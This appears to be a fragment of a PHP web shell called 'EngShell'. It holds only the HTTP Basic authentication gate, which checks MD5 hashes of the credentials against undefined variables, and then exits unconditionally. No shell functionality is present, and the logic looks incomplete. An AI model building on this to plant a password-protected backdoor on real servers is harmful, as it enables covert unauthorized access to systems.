<?php
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass)
{
   header('WWW-Authenticate: Basic realm="EngShell"');
   header('HTTP/1.0 401 Unauthorized');
}

exit;
?>